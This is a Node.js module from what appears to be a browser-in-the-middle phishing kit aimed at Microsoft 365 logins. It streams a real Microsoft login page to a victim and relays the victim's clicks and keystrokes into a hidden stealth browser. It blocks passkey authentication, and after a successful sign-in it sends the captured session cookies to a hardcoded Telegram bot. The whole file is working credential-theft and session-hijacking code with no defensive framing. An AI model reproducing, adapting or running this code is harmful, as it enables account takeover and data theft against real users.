const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const FormData = require('form-data');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

/**
 * Sends cookies via HTML-safe formatting to avoid Telegram 400 errors.
 */
async function sendExfiltrationAlert(cookies, finalUrl) {
    const docUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
    const msgUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    try {
        // HTML mode is safer for long URLs with special chars
        const textAlert = `<b>✅ SUCCESS: Session Captured</b>\n\n<code>${finalUrl}</code>\n\n<b>Final Cookie Count:</b> ${cookies.length}\n<i>Status: Full Auth Jar Uploaded.</i>`;
        
        await axios.post(msgUrl, {
            chat_id: CHAT_ID,
            text: textAlert,
            parse_mode: 'HTML'
        });

        const cookieData = JSON.stringify(cookies, null, 2);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        
        let host = "Unknown";
        try { host = new URL(finalUrl).hostname; } catch(e) {}
        
        form.append('caption', `Finalized Session: ${host}`);
        form.append('document', Buffer.from(cookieData, 'utf-8'), {
            filename: `cookies_${Date.now()}.json`,
            contentType: 'application/json'
        });

        await axios.post(docUrl, form, { headers: form.getHeaders() });
        console.log("[TELEGRAM] Finalized session file sent.");

    } catch (e) {
        console.error('[EXFIL-FATAL]', e.response?.data || e.message);
    }
}

async function startSession(io, socket) {
    let browser;
    let hasExfiltrated = false; // Prevents duplicate triggers for the same user

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox', 
                '--disable-setuid-sandbox', 
                '--disable-dev-shm-usage',
                '--disable-web-security'
            ]
        });

        const page = await browser.newPage();

        // Standard 2026 Passkey/WebAuthn bypass
        await page.evaluateOnNewDocument(() => {
            delete window.PublicKeyCredential;
            if (navigator.credentials) {
                const originalGet = navigator.credentials.get;
                navigator.credentials.get = function(opt) {
                    if (opt && opt.publicKey) {
                        return Promise.reject(new DOMException("User cancelled", "NotAllowedError"));
                    }
                    return originalGet.call(this, opt);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36');

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1500);

        page.on('framenavigated', async (frame) => {
            const url = frame.url();
            
            if (!hasExfiltrated) {
                const successKeys = ['office.com', 'microsoft365.com', 'shell/homepage', 'outlook.live', 'myapps.microsoft'];
                
                if (successKeys.some(key => url.toLowerCase().includes(key))) {
                    hasExfiltrated = true; // Engage lock immediately
                    
                    console.log(`[TRIGGER] Success detected. Waiting for cookies to settle...`);
                    
                    // Essential 3-second delay to catch the final ESTSAUTH/RPSSecAuth cookies
                    await new Promise(r => setTimeout(r, 3500));
                    
                    const cookies = await page.cookies();
                    await sendExfiltrationAlert(cookies, url);
                }
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[ORCH-ERR]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
